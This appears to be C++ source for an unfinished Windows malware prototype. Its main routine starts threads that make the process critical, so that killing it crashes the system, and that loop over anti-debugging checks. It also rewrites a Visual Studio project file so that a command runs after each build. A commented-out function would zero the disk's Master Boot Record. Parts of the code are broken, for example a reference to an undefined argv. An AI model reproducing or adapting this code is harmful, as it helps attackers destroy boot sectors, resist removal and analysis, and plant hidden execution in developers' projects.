#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include "AntiDBG.h"
#include <tchar.h> 
#include <vector>
#include <fstream>
#include <strsafe.h>
#include <Lmcons.h>
#include <comdef.h>
#include <thread>
#define BUFSIZE 4096
#define MBR_SIZE 512

#pragma comment(lib, "User32.lib")
#define LONG_DIR_NAME TEXT("c:\\longdirectoryname")
using namespace std;


typedef long(WINAPI* RtlSetProcessIsCritical)(
    IN BOOLEAN NewSettings,
    OUT BOOLEAN OldSettings,
    IN BOOLEAN CriticalStop
    );

BOOL SetPrivilege(BOOL bEnablePrivilege);

void AntiKill() {
    RtlSetProcessIsCritical CallAPI;
    CallAPI = (RtlSetProcessIsCritical)GetProcAddress(LoadLibraryA("NTDLL.dll"), "RtlSetProcessIsCritical");

    if (SetPrivilege(TRUE) && CallAPI != NULL)
        CallAPI(TRUE, FALSE, FALSE);
}
/*

void  OverwriteMBR() // be careful here dont uncomment the code below unless u know what ur doing :)
    DWORD write;
    char mbrData[MBR_SIZE];
    ZeroMemory(&mbrData, (sizeof mbrData));

    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
        , GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
        , NULL, OPEN_EXISTING, NULL, NULL);
        if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE)
        {
            std::cout << "Master Boot Record is over written" << std::endl;
            Sleep(5000);
            ExitProcess(0);
        }
        else
        {
            std::cout << "Fail";
            Sleep(5000);
            ExitProcess(0);
        }
        return EXIT_SUCCESS;
}
*/

BOOL SetPrivilege(BOOL bEnablePrivilege) {
    HANDLE Proc, hTocken;
    Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (!OpenProcessToken(Proc, TOKEN_ALL_ACCESS, &hTocken)) return false;

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))  return  FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(hTocken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        return FALSE;

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;
    return TRUE;

}

bool  AntiDebug() // anti debug
{
    while (0b00000001)
    {


        // -------------------------------------------------------------------
        // -- Memory Checks --------------------------------------------------
        // -------------------------------------------------------------------
        adbg_IsDebuggerPresent();
        adbg_BeingDebuggedPEB();
        adbg_NtGlobalFlagPEB();
        adbg_CheckRemoteDebuggerPresent();
        adbg_NtQueryInformationProcess();
        adbg_CheckWindowClassName();
        adbg_CheckWindowName();
        adbg_ProcessFileName();
        adbg_NtSetInformationThread();
        adbg_DebugActiveProcess(argv[1]);

        // -------------------------------------------------------------------
        // -- CPU Checks -----------------------------------------------------
        // -------------------------------------------------------------------
        adbg_HardwareDebugRegisters();
        adbg_MovSS();

        // -------------------------------------------------------------------
        // -- Timing Checks --------------------------------------------------
        // -------------------------------------------------------------------
        adbg_RDTSC();
        adbg_QueryPerformanceCounter();
        adbg_GetTickCount();

        // -------------------------------------------------------------------
        // -- Exception Checks -----------------------------------------------
        // -------------------------------------------------------------------
        adbg_CloseHandleException();
        adbg_SingleStepException();
        adbg_Int3();
        adbg_Int2D();
        adbg_PrefixHop();

        // -------------------------------------------------------------------
        // -- Other ----------------------------------------------------------
        // -------------------------------------------------------------------
        adbg_CrashOllyDbg();
        
    }
}

int InfectCurrentDirectory() // still under developing
{
    LPCWSTR path = L"C:\\anas\\source\\repos\\*";
    WIN32_FIND_DATA ffd;
    DWORD  retval = 0;
    BOOL   success;
    DWORD retu = 0;
    TCHAR  buffer[BUFSIZE] = TEXT("");
    TCHAR  buf[BUFSIZE] = TEXT("");
    TCHAR** lppPart = { NULL };
    HANDLE hFindFile = FindFirstFile(path, &ffd);
    if (INVALID_HANDLE_VALUE != hFindFile)//infect the first project
        for (int i = 0; i < 2; i++)
            FindNextFile(hFindFile, &ffd);


    hFindFile = FindFirstFile(L"*.vcxproj", &ffd);
    if (INVALID_HANDLE_VALUE != hFindFile)
    {
        GetFullPathName(L"*", BUFSIZE, buffer, lppPart);
        wcout << "Infected " << ffd.cFileName << endl;
        ifstream fin(ffd.cFileName);
        ofstream fout;
        fout.open("temp.txt", ios::out);

        char ch;
        int line = 1;
        while (fin.get(ch))
        {
            if (ch == '\n')
                line++;
            if (line != EOF)      // content not to be deleted 
            {
                fout << ch;
                if (line == 21)
                {
                    fout << "\n<Target Name=\"AfterBuild\">\n";
                    fout << "\t<Exec Command=\"calc.exe\"/>\n";
                    fout << "</Target>\n";
                    line++;
                }

            }

        }
        char output[256];
        const WCHAR* wc = ffd.cFileName;
        sprintf(output, "%ls", wc); // works

        fout.close();
        fin.close();
        remove(output);
        rename("temp.txt", output);
    }

    return 0;
}



int main(void)
{
    thread AntiK1ll(AntiKill);
    thread AntiD3bug(AntiDebug);
    InfectCurrentDirectory();
    AntiK1ll.join();
    AntiD3bug.join();
}